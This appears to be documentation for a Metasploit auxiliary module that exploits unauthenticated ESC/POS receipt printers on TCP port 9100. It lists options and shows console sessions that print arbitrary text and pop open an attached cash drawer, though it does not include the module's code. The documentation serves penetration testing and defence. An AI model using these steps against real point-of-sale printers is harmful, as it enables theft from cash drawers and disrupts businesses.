## Vulnerable Application

This module targets networked ESC/POS compatible printers that listen for raw commands on TCP port 9100.
The vulnerability is a lack of authentication and access control on this port, allowing anyone with
network access to send unauthenticated ESC/POS commands. The module exploits this by sending crafted
command sequences to inject custom print jobs, trigger the cash drawer, or manipulate the paper feed,
effectively taking control of the printer's physical functions.


- **Printer Model:** Any Epson-compatible printer exposing the ESC/POS command set
on TCP port 9100.

- **Protocol:** ESC/POS over TCP.

- **CVE:** Submitted for Epson-compatible thermal printers; awaiting assignment.



## Verification Steps



1. **Load the module:**
    use auxiliary/scanner/printer/escpos_tcp_command_injector

2. **Set required options:**
    set RHOST <printer_ip>

3. **Choose an action:**
    You can either print a message, trigger the drawer, or do both.
    - To print a message, set `PRINT_MESSAGE` to `true` and a `MESSAGE` string.
    - To trigger the drawer, set `TRIGGER_DRAWER` to `true`.
    - To do both, set both flags to `true`.

4. **Execute the module:**
    run

---


## Options

### MESSAGE

This option specifies the text to be sent to the printer.

* **Description:** The string of text you want the printer to output. It is only required when `PRINT_MESSAGE` is set to `true`.
* **Default:** "PWNED"
* **Example:** `set MESSAGE "Printing this now"`

### PRINT_MESSAGE

This boolean option controls whether a message is printed to the printer.

* **Description:** When set to `true`, the module will send the `MESSAGE` string to the printer.
* **Default:** `false`
* **Example:** `set PRINT_MESSAGE true`

### TRIGGER_DRAWER

This boolean option controls whether the module sends a command to open the cash drawer.

* **Description:** When set to `true`, the module will send the appropriate ESC/POS command to trigger the cash drawer.
* **Default:** `false`
* **Example:** `set TRIGGER_DRAWER true`



## Scenarios

### Example 1: Printing a Simple Message

This example shows how to use the module to send a simple text message to a network-connected ESC/POS printer.

msf6 > use auxiliary/scanner/printer/escpos_tcp_command_injector
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > set RHOSTS 192.168.1.200
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > set PRINT_MESSAGE true
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > run

[*] Sending print message to 192.168.1.200...
[+] Printed message to 192.168.1.200

### Example 2: Triggering the Cash Drawer

This scenario demonstrates the use of the `TRIGGER_DRAWER` option to send the specific
ESC/POS command to open a cash drawer connected to the printer.

msf6 > use auxiliary/scanner/printer/escpos_tcp_command_injector
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > set RHOSTS 192.168.1.200
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > set TRIGGER_DRAWER true
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > run

[*] Triggering cash drawer 2 times on 192.168.1.200...
[+] Triggered cash drawer on 192.168.1.200

### Example 3: Doing Both

This example shows how to use both options to print a message and trigger the drawer in a single run.

msf6 > use auxiliary/scanner/printer/escpos_tcp_command_injector
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > set RHOSTS 192.168.1.200
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > set PRINT_MESSAGE true
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > set TRIGGER_DRAWER true
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > set MESSAGE "Both commands sent!"
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > run

[*] Sending print message to 192.168.1.200...
[+] Printed message to 192.168.1.200
[*] Triggering cash drawer 2 times on 192.168.1.200...
[+] Triggered cash drawer on 192.168.1.200


This module has been tested against a physical Epson-compatible receipt printer and
verified to print custom messages and trigger the cash drawer.
For additional device compatibility, refer to the ESC/POS protocol documentation.
